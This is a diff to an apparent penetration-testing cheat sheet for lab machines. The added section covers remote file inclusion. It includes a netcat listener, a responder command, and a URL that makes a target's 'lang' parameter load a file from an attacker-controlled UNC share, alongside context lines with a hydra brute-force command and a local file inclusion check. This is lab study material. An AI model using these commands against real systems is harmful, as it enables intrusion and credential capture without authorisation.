@@ -36,5 +36,22 @@ hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k
 when there is something like ```http://10.10.10.151/blog/?lang=blog-en.php```
 if the host is Windows we can try to access this file in order to validate our findings:
 ```
-10.10.10.151/blog/?lang=/windows/system32/license.rtf
+http://10.10.10.151/blog/?lang=/windows/system32/license.rtf
+
 ```
+### REMOTE FILE INCLUSION
+
+If the local file inclusion works we can try a remote one
+
+attacker
+```
+nc -lvp 445
+
+//extra 
+sudo responder -I eth0  
+```
+website
+```
+http://10.10.10.151/blog/?lang=\\10.10.14.7\test\testFILE
+```
+
